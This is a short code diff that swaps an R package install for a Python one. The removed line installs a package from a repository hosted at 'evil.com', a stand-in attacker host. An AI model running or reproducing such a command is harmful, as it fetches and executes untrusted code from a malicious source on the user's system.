@@ -1,1 +1,1 @@
-install.packages("foo", repos = "https://evil.com/cran")
+reticulate::py_install("requests")
